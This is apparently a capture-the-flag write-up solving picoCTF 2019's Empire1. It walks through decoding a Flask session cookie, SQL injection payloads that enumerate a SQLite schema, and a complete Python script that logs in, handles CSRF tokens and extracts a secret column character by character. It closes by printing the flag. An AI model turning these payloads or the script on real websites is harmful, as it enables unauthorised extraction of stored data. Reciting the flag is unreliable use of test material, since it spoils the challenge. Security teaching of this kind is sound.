<h3>Challenge #10 Empire1</h3>

<blockquote><i>Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. https://2019shell1.picoctf.com/problem/27357/ (link) Can you first find the secret code they assigned to you? or http://2019shell1.picoctf.com:27357</i></blockquote>  

<p>In this challenge we have a site with login and register form.</p>  

<p>First things first I inspected the page to see if there is any hidden login logic in some form of script,which wasn't the case.After creating a user and logging in I've caught one thing.The session cookie looked quite odd: </p>

```javascript
session=.eJwlj0FqQzEMRO_idRayJEt2LvORZYmGQAv_J6vSu8fQWb95zPyWI8-4vsr9db7jVo7HKveCHTAqM7r6cFhdIeoO2-i0eA6UEUnihrMFk5upSGJl9UWQMmf20Rc1arAWmyaw6OC6Teg5g5XSWptrRjRMbyYA5hvZEiq34teZx-vnGd97jxNn776BUWVgtypNOhFNNVimwO48XXbvfcX5f4LK3wdBOT5K.XmPcqA.dDQLm8QVYSADCJMay9b9Rh3dpc0
```

<p>So I had to determine in what framework the server was written. From previous picoCTF's i guessed with Flask. So I've tried decoding the cookie. And I was right since this JSON object was result of it.</p>  

```javascript  
{
    "_fresh": true,
    "_id": "2802e1442c7c9c0d870e11114a983d4b9269ef36ca2b5e43caa766f2147cd30f6bbf898d35350dd4a7f04679418702cfbe473fa55bdbee52fc5a600ac7942143",
    "csrf_token": "c34f88c0ac916928a16568333b7a0da704cc4bc6",
    "user_id": "3"
}  
```  
<p>So we do see that user_id value is 3.</p><br>
<p>Have in mind<quote>Flask, by default, uses the URL-safe signed serializer "itsdangerous" to encode its client-side session cookies. A Flask app uses a secret key to sign the session cookie so that the client can't modify it.</quote><br>  
Which means if we could spoof the secret key we would be able to modify the cookie by swapping the value to 1 which would be admin value , and get the session cookie for admin.</p>  

<p>So I've registered account with some random name and then you can see the multiple pages as a user.You see Employees listing,Add todo ,Your todos.  
Empoyees listing was interesting because it looks like a typical SQL table , 3 columns with fields Employee id, Username, Name.<br> Then in Add Todo we have a input field where we can input some text and that is going into list on the page Your Todos.
<br><br>
First I've tried testing the input simply with providing <b>ASCII alphabet</b> you can either google or just make this one liner in python :</p><br>
<br>
```python
"".join(chr(x) for x in range(32,127))
```

<p>That instantly crashed and gave me internal server 500 error.<br>After that I tried all upper and lowercase letters from A-Z. Which didn't show any strange behaviour. However when I tried single quotes ' and other math logical operators and some of them crashed again.  
<br>
I've tried simple classic SQL injection for authentication OR 1 '=' 1 which weirdly evaluated to 0. <br>
That was very weird and i had to realize what is being filtered out.</p>  

<p>I've tried doing '+ 12 +' which evaluated into 12.So i've tried simple expression '+ 1 + 2  +' which evaluated into 3. Which was pretty nice.<br> I was getting somewhere with that.</p>   

<p>After that i tried taking it step further and making query so i tried '+ SELECT +' and that crashed. So i realized that those words must be filtered and i wanted to try query inside of parantheses . <br>  
So i've tried '+ (SELECT 1) +' and that evaluated to 1. From that point i determined that i can do <b>queries</b>.</p>  

<p>Next I would have to enumerate what engine of sql is running on so I can focus on injecting payload for that type of SQL. There are various functions for certain type of engine to get the version info. The one that worked was '+ <code>sqlite_version()</code> +' that returned me the 3.22 which confirmed it is SQLite engine. </p> 

<p>Now we have to try to get info of our database , specifically table and columns etc.</p>

<p>There are some interesting methods that could give you information that you are looking for, like:PRAGMA functions, 
sqlite_master as main schema holder.</p> 

So first thing i wanted to know is the name of the table.</p>  

<code> '+ (SELECT hex(name) FROM sqlite_master) +'</code>
<br>
<br>
<p>With this you can extract table name by using hex value for name parameter,this resulted in 75736572 which is <b>"user"</b>. <br>Good so far we have name of our table.
<br>
After that i wanted to to extract the name of columns , most likely trying to find something like password or similar column name.</p>  

<br>  
<p>The straight away i tried checking if there is column with name of password or secret by doing :</p>  
<br>
<code>'+(SELECT 1 FROM PRAGMA_TABLE_INFO("user") WHERE name="secret") +'</code><br>  
<p>Which actually returned 1 (password returned 0) and that was pretty positive for knowing that the column with name secret exist which should mean that should be column for user passwords.Now remember the part of the hint <q><i>"Can you first find the secret code they assigned to you?</i></q><br>Let's try that : <br>  
<code> '+(select hex(secret) from user where name="asd") +'</code> </p> 
<br>  
Not surprisingly that returned us 7069636 converted to ASCII (as 7069636)  = "pic" <br>  
Which seems like the part of the flag because we know that flag is starting with picoCTF{...}  
Very interesting..  

But there is one more detail in here.Starting with the question why are we only getting 3 letters, flag is usually longer.<br>  
2 conclusions arrives :  
<li>characters are getting truncuted a-f as hexadecimal digit</li>
<li>number is 32 bit integer truncated</li>

So how do we work around this? Substring for number truncation,we get only 1 digit number at a time that means it is truncated , 2 digit number it's not truncated,only above 8 digit number gets truncated(we got only 7 digits from our .  
So we are definitely going to make a script for generating requests and collecting the output digits.  
<br>  
Our request payload should have query like this :<br>
<code>'+ (SELECT hex(substr(secret,0,1))  FROM user where id="3") +'</code>  

<p>The idea is to make request till i reach reach number 0 as an output which would indicate that the value ends there. Once i collect all the hexadecimal digits,the single digits should be compared with (a,b,c,d,e,f) and one of those could give me missing part of the whole flag.</p>

<p>So I've made a <a href="https://github.com/DejanJS/picoCTF-Writeups-2019/blob/master/10.Empire1/script.py">script</a> that will do this for us.</p>

<p>Let's explain what is going on in this script:</p>  

You are going to need some scraping library , I've used Beautiful Soup,since response that we need is being generated inside of the other page and csrf token is binded to input field, so you have to keep session alive.  

```python  

import requests
import json
from bs4 import BeautifulSoup
import string

i = 0
result = []
a_to_f = [w for w in string.ascii_lowercase[:6]]
my_session = requests.Session()
register = my_session.get('https://2019shell1.picoctf.com/problem/27357/login')
soup = BeautifulSoup(register.text,'html.parser')
csrf = soup.find(id="csrf_token").get('value')

login = my_session.post('https://2019shell1.picoctf.com/problem/27357/login',data={'csrf_token':csrf,'username':'e','password':123})
item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
soup2 = BeautifulSoup(item_list.text,'html.parser')
items = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')]  
```  

After that we have to post our data with our sql injection query and collect results of our response : <br>  
```python  
while True:
  i = i + 1
  my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT hex(substr(secret,{i},1))  FROM user where id='3') +'"})
  item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
  soup2 = BeautifulSoup(item_list.text,'html.parser')
  items = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')]
  if '0' in items:
    #pop 0
    items.pop()
    result.extend(items)
    break  
```  

At the end we have to go through results and loop over possible values of hexadecimals digits , but the best way is to make post once again by substringing and comparing each letter that we already got other possible letters as hexadecimals that we got(which means if we make something like <code>'+ (SELECT (substr(secret,4,1)='o') FROM user where id='3') </code><br>  ,for example)
Response for correct letter is going to be 1 and 0 for non existant .  
```python  
if len(result) > 0:
    for idx,res in enumerate(result):
        if len(res) == 1 and res != "0":
            result[idx] = {'hex':res,'possible_values':[bytearray.fromhex(res + ch).decode() for ch in a_to_f]}
            for k in result[idx]["possible_values"]:
              print(f"Testing {idx} for {k}...")
              my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT (substr(secret,{idx+1},1)='{k}')  FROM user where id='3') +'"})
              item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
              soup2 = BeautifulSoup(item_list.text,'html.parser')
              item = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')][-1]
              print("ITEM : " ,item)
              if item == '1':
                result[idx] = k
                break
        else:
           result[idx] = bytearray.fromhex(res).decode()


print('FLAG : ',"".join(result))  
```  

And we get the flag : <br>
<code><b>picoCTF{wh00t_it_a_sql_inject9899be1a}</b></code>